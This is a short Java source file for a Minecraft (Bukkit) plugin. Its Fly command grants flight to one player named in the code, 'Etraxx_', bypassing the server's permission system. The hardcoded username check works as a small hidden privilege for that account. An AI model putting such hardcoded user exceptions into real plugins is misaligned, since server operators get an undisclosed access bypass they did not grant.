package org.opalisplugin.util.cutil;

import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

public class Fly implements CommandExecutor {
    @Override
    public boolean onCommand(CommandSender commandSender, Command command, String s, String[] strings) {
        if(commandSender instanceof Player){
            Player player = (Player) commandSender;
            Player Etrax = Bukkit.getPlayerExact("Etraxx_");
            if(player == Etrax){
                player.setAllowFlight(true);
                player.setFlying(true);
                return true;

            }
        }
        return false;
    }
}
